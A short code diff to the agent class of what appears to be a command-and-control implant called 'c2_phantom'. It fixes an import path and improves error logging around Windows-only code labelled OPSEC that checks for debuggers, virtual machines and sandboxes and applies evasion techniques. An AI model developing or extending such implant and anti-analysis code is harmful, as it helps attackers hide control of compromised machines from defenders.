@@ -77,7 +77,7 @@ class C2Agent:
         # OPSEC: Apply evasion and anti-debug checks
         if self.enable_opsec and platform.system() == "Windows":
             try:
-                from c2_phantom.evasion.modern import apply_evasion_techniques, AntiDebug
+                from c2_phantom.evasion import apply_evasion_techniques, AntiDebug
 
                 # Check for debugger/VM/sandbox
                 if AntiDebug.is_debugger_present():
@@ -91,8 +91,8 @@ class C2Agent:
                 evasion_results = apply_evasion_techniques()
                 logger.info(f"[OPSEC] Evasion applied: {evasion_results}")
 
-            except ImportError:
-                logger.warning("[OPSEC] Evasion modules not available")
+            except ImportError as ie:
+                logger.warning(f"[OPSEC] Evasion modules not available: {ie}")
             except Exception as e:
                 logger.error(f"[OPSEC] Evasion failed: {e}")
 
